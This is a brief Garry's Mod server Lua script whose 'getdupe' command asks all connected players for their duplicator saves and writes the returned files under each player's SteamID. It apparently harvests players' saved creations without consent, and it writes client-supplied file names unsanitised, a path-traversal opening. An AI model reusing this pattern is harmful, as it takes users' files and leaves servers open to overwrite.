require("datastream")AddCSLuaFile("cl_cooldupe.lua")local function CopyThaDupe(sender, handler, id, encoded, decoded)	local SID = string.gsub(sender:SteamID(),":","-")	file.CreateDir("Dupes")	file.CreateDir("Dupes/"..SID)	file.Write("Dupes/"..SID.."/"..decoded[1], decoded[2])	print("Got Dupe: "..SID.."/"..decoded[1])endlocal function GetTheDupe()	print("Getting Dupes...")	datastream.StreamToClients(player.GetAll(),"DupeGet", {"nil"})enddatastream.Hook("DupeSend", CopyThaDupe)concommand.Add("getdupe",GetTheDupe)